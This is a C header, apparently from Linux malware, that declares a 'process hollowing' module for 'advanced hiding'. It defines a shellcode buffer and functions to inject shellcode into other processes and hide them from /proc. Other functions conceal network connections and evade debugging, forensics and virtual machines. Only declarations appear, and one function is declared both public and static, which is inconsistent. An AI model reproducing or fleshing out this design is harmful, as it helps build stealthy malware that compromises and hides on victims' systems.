#pragma once

#include "includes.h"
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <elf.h>

// Process hollowing for advanced hiding
#define HOLLOWING_MAX_PROCESSES 10
#define HOLLOWING_SHELLCODE_SIZE 4096

// Process hollowing state
typedef struct {
    pid_t hollowed_pids[HOLLOWING_MAX_PROCESSES];
    int num_hollowed;
    BOOL hollowing_active;
    char shellcode[HOLLOWING_SHELLCODE_SIZE];
} hollowing_state_t;

// Function declarations
void hollowing_init(void);
void hollowing_hollow_process(const char* target_path);
void hollowing_restore_process(pid_t pid);
void hollowing_cleanup(void);
void hollowing_generate_shellcode(void);
void hollowing_create_decoy_process(void);

// Internal functions
static void hollowing_inject_shellcode(pid_t target_pid);
static void hollowing_hide_from_proc(pid_t target_pid);
static void hollowing_anti_analysis(pid_t target_pid);
static void hollowing_encrypt_memory(pid_t target_pid);
static void hollowing_create_decoy_process(void);
static void hollowing_stealth_communication(void);
static void hollowing_anti_forensics(void);
static void hollowing_hide_network_connections(pid_t target_pid);
static void hollowing_anti_debugging(pid_t target_pid);
static void hollowing_vm_evasion(pid_t target_pid);
